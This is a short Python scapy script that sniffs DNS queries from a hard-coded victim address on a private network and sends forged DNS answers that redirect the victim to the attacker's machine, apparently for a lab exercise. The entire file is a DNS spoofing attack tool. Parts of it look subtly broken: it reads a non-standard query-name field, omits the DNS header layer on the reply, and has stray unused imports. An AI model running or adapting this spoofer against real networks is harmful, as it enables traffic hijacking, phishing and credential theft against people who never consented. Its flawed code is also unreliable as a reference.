#!/usr/bin/env python3

from ntpath import join
from socket import timeout
from scapy.all import *
from scapy.layers.inet import IP, UDP, TCP, ICMP 
from scapy.layers.dns import *
import sys

THIS_IP = "192.168.50.128"
VICTIM_IP = "192.168.50.129"

#packet_filt = " and ".join([
#"udp dst port 53", # dns port filtering
#"udp[10] & 0x80 = 0", # dns only
#"src host 192.168.59.3"]) # ip source	

packet_filter = f"udp port 53 and ip dst {THIS_IP} and ip src {VICTIM_IP}"


def dns_reply(packet): 
	print("received")
	packet.show()
	send(
	IP(dst="192.168.50.129", src=THIS_IP)/
	UDP(dport=packet[UDP].sport, sport=53)/
	DNSRR(rrname=packet[DNS].name, rdata=THIS_IP))

print(packet_filter)
print("started sniffing")
sniff(filter = packet_filter,prn = dns_reply, store=0, iface="ens33")

